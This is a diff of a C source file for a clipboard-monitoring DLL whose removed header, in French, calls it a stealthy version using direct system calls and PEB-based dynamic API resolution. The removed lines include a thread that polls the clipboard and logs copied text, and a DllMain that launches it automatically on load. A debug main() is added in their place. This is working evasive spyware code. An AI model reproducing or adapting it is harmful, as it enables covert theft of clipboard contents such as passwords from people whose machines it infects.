@@ -1,11 +1,3 @@
-/**
- * @file clipboard-logger-stealth.c
- * @brief Version furtive de la DLL de surveillance du presse-papiers.
- * 
- * Cette version utilise des appels système directs pour les opérations de fichiers/threads
- * et la résolution dynamique via PEB pour les autres fonctions de l'API Windows.
- */
-
 #ifndef _WIN32_WINNT
 #define _WIN32_WINNT 0x0600
 #endif
@@ -117,76 +109,8 @@ void LogClipboardText(const char* text) {
     }
 }
 
-/**
- * @brief Fonction principale du thread de scrutation.
- */
-DWORD WINAPI PollingThread(LPVOID lpParam) {
-    DWORD dwLastSequence = 0;
-    DYNAMIC_APIS* api = getAPI();
-    
-        dwLastSequence = api->pGetClipboardSequenceNumber();
-
-    while (g_bRunning) {
-            DWORD dwCurrentSequence = api->pGetClipboardSequenceNumber();
-
-            if (dwCurrentSequence != dwLastSequence) {
-                dwLastSequence = dwCurrentSequence;
-
-                if (api->pOpenClipboard(NULL)) {
-                        HANDLE hData = api->pGetClipboardData(CF_TEXT);
-                        if (hData) {
-                            char* pszText = (char*)api->pGlobalLock(hData);
-                            if (pszText) {
-                                LogClipboardText(pszText);
-                                api->pGlobalUnlock(hData);
-                            }
-                        }
-                    api->pCloseClipboard();
-                }
-            }
-        api->pSleep(POLLING_INTERVAL);
-    }
-
-    return 0;
-}
-
-/**
- * @brief Point d'entrée de la DLL.
- */
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
-    g_hInstance = hinstDLL;
-
-    switch (fdwReason) {
-        case DLL_PROCESS_ATTACH:
-            {
-                DYNAMIC_APIS* api = InitDynamicAPIs();
-                if (!api) return FALSE;
-
-                api->pDisableThreadLibraryCalls(hinstDLL);
-                
-                g_bRunning = TRUE;
-                
-                dCreateThreadEx(
-                    &g_hThread, 
-                    THREAD_ALL_ACCESS, 
-                    NULL,
-                    GetCurrentProcess(), 
-                    PollingThread,
-                    NULL,
-                    0, 0, 0, 0, 
-                    NULL
-                );
-            }
-            break;
-
-        case DLL_PROCESS_DETACH:
-            g_bRunning = FALSE;
-            if (g_hThread) {
-                DYNAMIC_APIS* api = getAPI();
-                api->pWaitForSingleObject(g_hThread, 1000);
-                api->pCloseHandle(g_hThread);
-            }
-            break;
-    }
-    return TRUE;
+int main(int argc, char ** argv)
+{
+    InitDynamicAPIs();
+    LogClipboardText("debug");
 }
